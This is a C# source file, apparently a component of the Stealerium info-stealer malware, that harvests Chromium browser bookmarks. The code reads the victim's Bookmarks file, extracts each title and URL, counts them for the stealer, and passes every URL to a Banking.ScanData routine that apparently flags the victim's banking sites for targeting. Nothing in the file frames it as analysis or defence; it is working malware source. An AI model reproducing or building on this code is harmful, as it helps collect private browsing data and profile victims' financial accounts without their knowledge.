using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium;

internal sealed class Bookmarks
{
	public static List<Bookmark> Get(string sBookmarks)
	{
		List<Bookmark> list = new List<Bookmark>();
		try
		{
			if (!File.Exists(sBookmarks))
			{
				return list;
			}
			string[] array = Regex.Split(Regex.Split(Regex.Split(File.ReadAllText(sBookmarks, Encoding.UTF8), "      \"bookmark_bar\": {")[1], "      \"other\": {")[0], "},");
			foreach (string text in array)
			{
				if (!text.Contains("\"name\": \"") || !text.Contains("\"type\": \"url\",") || !text.Contains("\"url\": \"http"))
				{
					continue;
				}
				int num = 0;
				string[] array2 = Regex.Split(text, Parser.Separator);
				foreach (string data in array2)
				{
					num++;
					Bookmark item = default(Bookmark);
					if (Parser.DetectTitle(data))
					{
						item.Title = Parser.Get(text, num);
						item.Url = Parser.Get(text, num + 2);
						if (!string.IsNullOrEmpty(item.Title) && !string.IsNullOrEmpty(item.Url) && !item.Url.Contains("Failed to parse url"))
						{
							Banking.ScanData(item.Url);
							Counter.Bookmarks++;
							list.Add(item);
						}
					}
				}
			}
			return list;
		}
		catch (Exception ex)
		{
			Logging.Log("Chromium >> Failed collect bookmarks data\n" + ex);
			return list;
		}
	}
}
